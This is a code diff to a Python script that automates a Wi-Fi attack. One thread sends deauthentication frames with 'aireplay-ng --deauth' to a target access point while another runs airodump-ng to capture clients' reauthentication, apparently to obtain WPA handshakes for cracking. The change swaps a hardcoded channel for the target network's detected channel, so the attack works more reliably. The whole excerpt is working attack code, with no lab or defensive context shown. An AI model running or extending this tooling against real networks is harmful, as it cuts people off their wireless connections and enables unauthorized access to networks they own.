@@ -59,8 +59,9 @@ def start_airodump(airodump_args, stop_event):
     proc.terminate()
     proc.wait()
 
-def send_deauths(aireplay_args, stop_event):
-    put_interface_in_same_channel(aireplay_args["interface"], "6")
+def send_deauths(aireplay_args, stop_event, channel):
+    put_interface_in_same_channel(aireplay_args["interface"], channel)
+    
     cmd = [
         "sudo", "aireplay-ng", "--deauth", str(aireplay_args["deauths"]),
         "-a", aireplay_args["BSSID"], aireplay_args["interface"]
@@ -208,7 +209,7 @@ def main():
         # In second thread, capture the automatic reauthentication attempt
         airodump_args = { "cap_file_name": args.capfile, "channel": network_info["channel"], "BSSID": network_info["BSSID"], "interface": args.interface }
 
-        deauth_thread = threading.Thread(target=send_deauths, args=(aireplay_args, aireplay_stop_event))
+        deauth_thread = threading.Thread(target=send_deauths, args=(aireplay_args, aireplay_stop_event, network_info["channel"]))
         airodump_thread = threading.Thread(target=start_airodump, args=(airodump_args, airodump_stop_event))
 
         airodump_thread.start()
